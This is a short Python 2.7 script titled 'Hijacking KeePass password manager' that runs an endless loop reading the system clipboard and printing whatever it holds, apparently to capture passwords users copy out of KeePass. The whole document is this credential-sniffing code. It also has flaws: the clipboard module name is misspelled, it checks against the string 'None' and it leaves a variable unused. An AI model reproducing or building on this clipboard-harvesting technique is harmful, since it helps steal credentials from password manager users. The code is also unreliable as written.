# Hijacking KeePass password manager python 2.7
import pypercliper
import time

list = []

while True: # infinite loop to continously check the clipboard
	if pypercliper.paste() !='None': #if the clipboard content is not empty ...
	    value = pypercliper.paste() # then we will take its value and put it into variable called value
	    print(pypercliper.paste())
	pass